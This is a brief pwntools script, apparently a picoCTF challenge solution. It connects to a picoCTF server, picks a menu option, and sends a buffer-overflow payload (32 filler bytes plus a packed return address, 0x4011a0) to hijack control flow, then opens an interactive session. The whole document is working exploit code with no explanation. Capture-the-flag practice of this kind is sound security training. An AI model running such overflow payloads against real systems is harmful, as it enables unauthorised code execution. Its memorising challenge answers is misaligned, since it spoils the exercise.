from pwn import * 

conn = remote('mimas.picoctf.net', 63059)

conn.sendafter(b'Enter your choice: ', b'2\n')

payload = b'a' * 32
payload += p64(0x4011a0)

conn.sendafter(b'Data for buffer: ', payload)

conn.sendline(b'\n4')

conn.interactive()

